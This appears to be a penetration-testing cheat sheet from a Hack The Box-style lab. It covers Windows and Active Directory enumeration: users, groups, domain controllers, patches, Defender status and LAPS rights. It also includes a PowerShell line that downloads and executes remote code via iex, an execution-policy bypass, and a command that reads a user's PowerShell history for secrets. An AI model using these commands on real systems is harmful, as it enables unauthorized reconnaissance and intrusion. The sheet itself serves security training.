# Basic Enumeration Commands
## hostname
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
## System.Environment::OSVersion.Version

```
enumdomusers 
```
## Enumeration Commands
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
```
ipconfig /all
```
```
set
```
```
echo %USERDOMAIN%
```
```
echo %logonserver%
```
```
Get-Module
```
```
Get-ExecutionPolicy -List
```
```
Set-ExecutionPolicy Bypass -Scope Process
```
```
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
```
Get-ChildItem Env: | ft Key,Value
```
```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```
# Checking Defenses
```
PS C:\htb> netsh advfirewall show allprofiles
```
```
C:\htb> sc query windefend
```
```
PS C:\htb> Get-MpComputerStatus
```
# Am I Alone?
```
PS C:\htb> qwinsta
```
# Network Information
```
arp -a
```
```
ipconfig /all
```
```
route print
```
```
netsh advfirewall show state
```
# Windows Management Instrumentation (WMI)
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
```
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
```
```
wmic process list /format:list
```
```
wmic ntdomain list /format:list
```
```
wmic useraccount list /format:list
```
```
wmic group list /format:list
```
```
wmic sysaccount list /format:list
```
# Net Commands
## Listing Domain Groups
```
PS C:\htb> net group /domain
```
## Information about a Domain User
```
PS C:\htb> net user /domain wrouse
```
# Dsquery
## We need an elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context
### User Search
```
PS C:\htb> dsquery user
```
### Computer Search
```
PS C:\htb> dsquery computer
```
### Wildcard Search
```
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
### Users With Specific Attributes Set (PASSWD_NOTREQD)
```
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
### Searching for Domain Controllers
```
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
## LDAP Filtering
# Enumerating Security Controls
## get the current Defender status
```
Get-MpComputerStatus
```
```
RealTimeProtectionEnabled parameter is set to True
```
```
Find-LAPSDelegatedGroups
```
```
Find-AdmPwdExtendedRights
```
```
Get-LAPSComputers
```